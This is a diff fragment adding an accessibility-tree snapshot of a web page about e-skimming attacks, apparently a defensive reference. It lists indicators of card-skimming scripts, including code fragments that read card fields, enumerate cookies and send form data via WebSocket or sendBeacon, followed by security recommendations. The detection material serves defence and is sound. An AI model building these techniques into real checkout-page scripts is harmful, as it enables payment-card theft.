+            - listitem [ref=e568]: Payment field CSS selectors
+            - listitem [ref=e569]: Debugger detection code
+            - listitem [ref=e570]: Environment fingerprinting (WebGL queries)
+            - listitem [ref=e571]: Fetch/XHR to non-payment-processor domains
+      - generic [ref=e572]:
+        - strong [ref=e573]: "High-Risk Patterns to Monitor:"
+        - text: •
+        - code [ref=e574]: querySelector('[name*="card"]')
+        - text: in unknown scripts
+        - text: •
+        - code [ref=e575]: document.cookie
+        - text: enumeration on checkout pages
+        - text: •
+        - code [ref=e576]: new WebSocket()
+        - text: on payment forms
+        - text: •
+        - code [ref=e577]: navigator.sendBeacon()
+        - text: with form data
+        - text: • Multiple encoding layers (Base64 + hex + custom)
+    - generic [ref=e578]:
+      - generic [ref=e579]:
+        - generic [ref=e580]: 💡
+        - heading "Recommendations" [level=2] [ref=e581]
+      - generic [ref=e582]:
+        - heading "For E-Commerce Platforms" [level=4] [ref=e583]
+        - list [ref=e584]:
+          - listitem [ref=e585]:
+            - strong [ref=e586]: "Defense in Depth:"
+            - text: CSP + SRI + FIM + Network Monitoring (no single control is sufficient)
+          - listitem [ref=e587]:
+            - strong [ref=e588]: "Enforce MFA:"
+            - text: All admin accounts require multi-factor authentication
+          - listitem [ref=e589]:
+            - strong [ref=e590]: "Third-Party Risk:"
+            - text: Vendor assessments, SRI for external scripts, regular audits
+          - listitem [ref=e591]:
+            - strong [ref=e592]: "Continuous Monitoring:"
+            - text: Real-time FIM alerts, network anomaly detection, checkout page monitoring
+          - listitem [ref=e593]:
+            - strong [ref=e594]: "Incident Response:"
+            - text: Documented procedures, regular drills, forensic readiness
+      - generic [ref=e595]:
+        - heading "For Security Teams" [level=4] [ref=e596]
+        - list [ref=e597]:
+          - listitem [ref=e598]:
+            - strong [ref=e599]: "Threat Hunting:"
+            - text: Regular code reviews, network traffic baselining, event listener inventory
+          - listitem [ref=e600]:
+            - strong [ref=e601]: "Detection Engineering:"
+            - text: Custom Semgrep rules, Suricata signatures, behavioral monitoring
+          - listitem [ref=e602]:
+            - strong [ref=e603]: "Training:"
+            - text: Developer secure coding, incident response drills, e-skimming TTP education
+  - generic [ref=e604] [cursor=pointer]: ↑
+  - contentinfo [ref=e605]:
+    - paragraph [ref=e606]: "MITRE ATT&CK Matrix for E-Skimming Attacks | Version 1.0 | Last Updated: 2025-01-18"
+    - paragraph [ref=e607]: Based on extensive research and analysis of real-world e-skimming campaigns
+```
